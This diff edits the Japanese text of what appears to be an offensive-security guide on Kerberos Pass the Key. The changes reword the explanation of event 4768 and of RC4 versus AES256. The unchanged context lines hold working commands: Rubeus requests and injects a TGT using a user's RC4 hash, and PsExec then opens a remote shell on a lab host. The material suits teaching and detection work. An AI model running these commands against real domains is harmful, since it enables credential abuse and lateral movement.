@@ -24,7 +24,7 @@ Rubeus.exeを使用した別のコマンドシーケンスは、この技術の�
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-この方法は**Pass the Key**アプローチを反映しており、認証目的でチケットを直接指揮し利用することに焦点を当てています。TGTリクエストの開始はイベント`4768: A Kerberos authentication ticket (TGT) was requested`をトリガーし、デフォルトでRC4-HMACの使用を示しますが、現代のWindowsシステムはAES256を好みます。
+この方法は**Pass the Key**アプローチを反映しており、認証目的でチケットを直接操作し利用することに焦点を当てています。TGTリクエストの開始は、イベント`4768: A Kerberos authentication ticket (TGT) was requested`をトリガーし、デフォルトでRC4-HMACの使用を示しますが、最新のWindowsシステムはAES256を好みます。
 
 運用セキュリティに準拠し、AES256を使用するには、次のコマンドを適用できます：
 ```bash
